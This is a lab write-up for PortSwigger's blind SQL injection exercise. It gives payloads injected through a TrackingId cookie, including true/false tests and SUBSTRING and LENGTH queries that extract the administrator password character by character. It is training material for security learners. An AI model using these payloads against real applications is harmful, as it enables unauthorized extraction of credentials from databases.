# Blind SQL Injection with Conditional Responses

## PortSwigger Web Security Academy

**Category:** SQL Injection  
**Lab:** Blind SQL injection with conditional responses  
**Status:** ✅ Solved

---

## Lab Description

This lab contains a blind SQL injection vulnerability.

The application uses a tracking cookie to determine whether a user has visited the website before. The value of this cookie is incorporated into a SQL query.

The application does not directly return database information in the response. However, the response changes depending on whether the injected SQL condition is **true or false**.

This difference can be used to perform a blind SQL injection attack and retrieve information from the database.

---

## Objective

Exploit the blind SQL injection vulnerability to determine the password of the administrator user and log in as the administrator.

---

## Vulnerability

The application uses the `TrackingId` cookie in a SQL query without properly parameterizing the input.

A vulnerable query may be conceptually similar to:

```sql
SELECT * FROM tracking
WHERE TrackingId = 'xyz'

Because the TrackingId value is controlled by the client, SQL syntax can be injected into the cookie.

The important observation is that the application behaves differently when the SQL condition evaluates to TRUE compared with when it evaluates to FALSE.

This allows information to be extracted one character at a time.

Solution
Step 1: Access the Lab

First, open the PortSwigger Web Security Academy lab.

Browse the application normally and capture a request using Burp Suite.

The request contains a cookie similar to:

Cookie: TrackingId=xyz

The TrackingId cookie is the parameter that will be tested.

Step 2: Send the Request to Burp Repeater

Send the request to Burp Suite Repeater.

This makes it easier to modify the TrackingId cookie and observe changes in the response.

The original cookie looks similar to:

TrackingId=xyz
Step 3: Test a TRUE Condition

Modify the TrackingId cookie with a SQL injection payload:

xyz' AND '1'='1

The resulting SQL query is conceptually similar to:

SELECT * FROM tracking
WHERE TrackingId = 'xyz'
AND '1'='1'

The condition:

'1'='1'

is TRUE.

The application responds in the normal way.

This confirms that the parameter may be vulnerable to SQL injection.

Step 4: Test a FALSE Condition

Now change the payload to:

xyz' AND '1'='2

The query becomes conceptually:

SELECT * FROM tracking
WHERE TrackingId = 'xyz'
AND '1'='2'

This condition is FALSE.

The application's response changes compared with the TRUE condition.

This difference provides a way to determine whether an injected SQL condition is true or false.

Extracting Database Information

Once the blind SQL injection is confirmed, the database can be queried using conditional statements.

The general idea is:

' AND (condition)--

If the condition is TRUE, the application produces the TRUE response.

If the condition is FALSE, the response changes.

Therefore, database information can be extracted one condition at a time.

Step 5: Determine Whether the Administrator User Exists

The users table can be queried to determine whether the administrator account exists.

A conceptual query is:

SELECT * FROM users
WHERE username = 'administrator'

The blind injection can test this condition:

' AND (SELECT 'a' FROM users WHERE username='administrator')='a

If the application's TRUE response is returned, the administrator account exists.

Determining the Password Length

After confirming that the administrator account exists, the next step is to determine the length of the administrator's password.

The following type of condition can be used:

' AND (SELECT LENGTH(password)
FROM users
WHERE username='administrator') > 1--

The number can then be increased:

' AND (SELECT LENGTH(password)
FROM users
WHERE username='administrator') > 2--
' AND (SELECT LENGTH(password)
FROM users
WHERE username='administrator') > 3--

Continue testing different values until the TRUE/FALSE response changes.

This allows the password length to be determined.

Determining the Password Characters

Once the password length is known, each character can be determined individually.

For example, the first character can be tested using:

' AND SUBSTRING(
    (SELECT password FROM users WHERE username='administrator'),
    1,
    1
)='a'--

If the response indicates TRUE, the first character is a.

If it is FALSE, test another character:

' AND SUBSTRING(
    (SELECT password FROM users WHERE username='administrator'),
    1,
    1
)='b'--

Continue testing characters until the correct character is identified.

The same process can then be repeated for:

Position 1
Position 2
Position 3
Position 4
...

until the complete password is recovered.

Character Extraction Concept

The attack works by repeatedly asking the database questions such as:

Is character 1 equal to 'a'?
Is character 1 equal to 'b'?
Is character 1 equal to 'c'?

Once the correct character is found, the process moves to the next position.

For example:

Position 1 → ?
Position 2 → ?
Position 3 → ?
Position 4 → ?
...

Eventually, the complete password can be reconstructed.

Burp Suite Workflow

The overall process used in the lab was:

Browser
   ↓
Capture Request
   ↓
Burp Suite Proxy
   ↓
Send Request to Repeater
   ↓
Identify TrackingId Cookie
   ↓
Test TRUE Condition
   ↓
Test FALSE Condition
   ↓
Confirm Blind SQL Injection
   ↓
Identify Administrator Account
   ↓
Determine Password Length
   ↓
Extract Password Characters
   ↓
Recover Administrator Password
   ↓
Login as Administrator
Why This Attack Works

The vulnerability exists because the application places the TrackingId value directly into a SQL query.

The attacker does not need the application to display database results directly.

Instead, the attacker observes a difference between two application responses:

TRUE condition  → Normal response
FALSE condition → Different response

This creates a Boolean oracle.

By repeatedly sending TRUE/FALSE questions to the database, information can be extracted without directly seeing the database query results.

Example Payloads
TRUE condition
' AND '1'='1
FALSE condition
' AND '1'='2
Check administrator account
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Test password length
' AND (SELECT LENGTH(password)
FROM users
WHERE username='administrator') > 10--
Test a password character
' AND SUBSTRING(
    (SELECT password FROM users WHERE username='administrator'),
    1,
    1
)='a'--
Tools Used
Burp Suite
Burp Suite Repeater
Web Browser
PortSwigger Web Security Academy
Key Takeaways
Blind SQL injection occurs when SQL query results are not directly displayed to the attacker.
Application behavior can still reveal whether an injected SQL condition is TRUE or FALSE.
Boolean-based blind SQL injection can be used to extract database information one character at a time.
Cookies can be SQL injection attack surfaces just like URL parameters and form inputs.
Password length and individual password characters can be determined through repeated conditional queries.
Parameterized queries and prepared statements should be used to prevent SQL injection.
Lab Status

Status: ✅ Solved

Vulnerability: Blind SQL Injection

Technique: Boolean-based SQL Injection

Injection Point: TrackingId cookie

Impact: Extraction of sensitive database information

Disclaimer

This write-up was created for educational and authorized security testing purposes using the PortSwigger Web Security Academy lab environment.

Do not use these techniques against systems without explicit authorization.
